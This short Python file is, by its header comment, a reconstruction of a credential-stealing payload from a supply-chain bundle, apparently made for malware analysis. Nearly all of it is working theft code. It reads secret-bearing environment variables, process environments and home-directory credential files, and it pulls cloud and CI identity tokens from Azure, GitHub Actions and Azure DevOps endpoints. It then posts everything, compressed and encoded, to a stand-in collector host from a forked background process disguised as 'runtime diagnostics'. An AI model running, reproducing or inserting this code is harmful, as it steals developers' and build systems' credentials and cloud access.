# Reconstruction from the Orca bundle, not recovered release bytes.
import os, glob, json, zlib, base64
from pathlib import Path
import urllib.request

def collect():
    bundle = {'env': {k: v for k, v in os.environ.items()
                      if any(s in k.upper() for s in ('TOKEN', 'SECRET', 'KEY', 'AZURE', 'AWS', 'GITHUB', 'OPENAI', 'HF_'))}}
    bundle['processes'] = {}
    for entry in glob.glob('/proc/[0-9]*/environ')[:300]:
        try:
            bundle['processes'][entry] = Path(entry).read_bytes().decode(errors='replace')
        except OSError:
            pass
    bundle['files'] = {}
    for relative in ('.azure/accessTokens.json', '.azure/msal_token_cache.json', '.npmrc', '.config/pip/pip.conf', '.netrc', '.git-credentials', '.docker/config.json', '.cache/huggingface/token', '.env'):
        try:
            bundle['files'][relative] = (Path.home() / relative).read_text()
        except OSError:
            pass
    bundle['imds'] = urllib.request.urlopen(urllib.request.Request(
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        headers={'Metadata': 'true'})).read().decode()
    endpoint = os.environ.get('IDENTITY_ENDPOINT')
    if endpoint:
        bundle['identity'] = urllib.request.urlopen(urllib.request.Request(endpoint, headers={'X-IDENTITY-HEADER': os.environ.get('IDENTITY_HEADER', '')})).read().decode()
    oidc = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    if oidc:
        bundle['github'] = urllib.request.urlopen(urllib.request.Request(oidc, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})).read().decode()
    ado = os.environ.get('SYSTEM_OIDCREQUESTURI')
    if ado:
        bundle['ado'] = urllib.request.urlopen(urllib.request.Request(ado, data=b'', headers={'Authorization': 'Bearer ' + os.environ.get('SYSTEM_ACCESSTOKEN', '')})).read().decode()
    payload = base64.urlsafe_b64encode(zlib.compress(json.dumps(bundle).encode()))
    urllib.request.urlopen(urllib.request.Request('https://collector.example.invalid/intake', data=payload, headers={'User-Agent': 'runtime-diagnostics/1'}, method='POST'))

def start():
    if os.environ.get('AF_DIAGNOSTICS_STARTED'):
        return
    os.environ['AF_DIAGNOSTICS_STARTED'] = '1'
    if os.fork() == 0:
        os.setsid()
        try:
            collect()
        finally:
            os._exit(0)
